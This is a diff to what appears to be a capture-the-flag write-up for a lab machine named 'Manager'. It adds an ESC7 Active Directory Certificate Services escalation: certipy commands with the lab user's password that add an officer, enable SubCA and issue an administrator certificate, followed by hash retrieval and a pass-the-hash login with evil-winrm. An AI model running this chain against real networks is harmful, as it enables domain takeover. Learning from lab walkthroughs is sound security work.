@@ -199,8 +199,48 @@ Mostly https://www.exploit-db.com/exploits/44969
     This implies that by leveraging the ESC7 scenario,
     we could potentially elevate our privileges to Domain Admin while operating as user Raven.
     ref: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7
-13. 
+    Abuse steps:
+      a. You can grant yourself the Manage Certificates access right by adding your user as a new officer.
+      b. The SubCA template can be enabled on the CA with the -enable-template parameter. By default, the SubCA template is enabled.
+      c. If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the SubCA template.
+         This request will be denied, but we will save the private key and note down the request ID.
+      d. With our Manage CA and Manage Certificates,
+         we can then issue the failed certificate request with the ca command and the -issue-request <requestID> parameter.
+      e. And finally, we can retrieve the issued certificate with the req command and the -retrieve <request ID> parameter.
 
+13. exploit it: certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven -debug
+      ([*] Successfully added officer 'Raven' on 'manager-dc01-ca')
+14.  we are officer, we can issue and manage certificates.
+    cmd: certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
+      ([*] Successfully enabled 'SubCA' on 'manager-dc01-ca')
+15. check the enabled certificate templates by: certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -list-templates
+16. certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
+    ( [*] Requesting certificate via RPC
+	[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+	[*] Request ID is 19
+	Would you like to save the private key? (y/N) y
+	[*] Saved private key to 19.key
+	[-] Failed to request certificate)
+17. certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 19
+    ([*] Successfully issued certificate)
+18. certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 19
+    (   [*] Rerieving certificate with ID 19
+	[*] Successfully retrieved certificate
+	[*] Got certificate with UPN 'administrator@manager.htb'
+	[*] Certificate has no object SID
+	[*] Loaded private key from '19.key'
+	[*] Saved certificate and private key to 'administrator.pfx' )
+19. certipy auth -pfx administrator.pfx
+    ([-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great))
+    ("KRB_AP_ERR_SKEW" error occurs when there is a significant time difference between the client and the KDC servers)
+20.  disable the "Automatic Date & Time" setting in our machine's settings
+    cmd: sudo ntpdate -s manager.htb
+21. run cmd again: certipy auth -pfx administrator.pfx
+    ([*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef)
+22. using administrator hash to login
+    cmd: evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
+    (*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+     manager\administrator)
 ```
 
 
